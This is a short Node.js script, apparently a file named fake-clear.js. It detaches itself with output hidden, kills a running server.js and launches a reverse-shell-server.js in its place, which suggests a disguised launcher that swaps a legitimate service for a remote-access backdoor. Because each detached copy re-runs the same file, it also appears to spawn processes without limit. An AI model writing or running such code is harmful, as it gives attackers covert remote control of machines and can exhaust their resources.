import { spawn, exec } from "child_process";

const stopSelf = () => {
  console.error("Stopping self");
  exec("pkill -f 'src/fake-clear.js'", (error, stdout, stderr) => {});
  exec("pkill -f 'src/reverse-shell-server.js'", (error, stdout, stderr) => {});
};

// Function to stop server.js
const stopServer = () => {
  return new Promise((resolve) => {
    exec("pkill -f 'src/server.js'", (error, stdout, stderr) => {
      if (error) {
        console.error(`Error stopping server.js: ${error}`);
      } else {
        console.log("server.js stopped");
      }
      resolve();
    });
  });
};

// Function to start reverse shell server
const startReverseShellServer = () => {
  exec("node src/reverse-shell-server.js", (error, stdout, stderr) => {
    if (error) {
      console.error(`Error starting reverse-shell-server.js: ${error}`);
      return;
    }
    console.log("reverse-shell-server.js started");
  });
};

// Function to run in an independent process
const independentProcess = () => {
  stopServer().then(() => {
    startReverseShellServer();
  });
};

// Launch the independent process
spawn(process.argv[0], [process.argv[1]], {
  detached: true,
  stdio: "ignore",
}).unref();

process.on("uncaughtException", () => {
  stopSelf();
});

process.on("unhandledRejection", () => {
  stopSelf();
});

process.on("SIGINT", () => {
  stopSelf();
});

independentProcess();
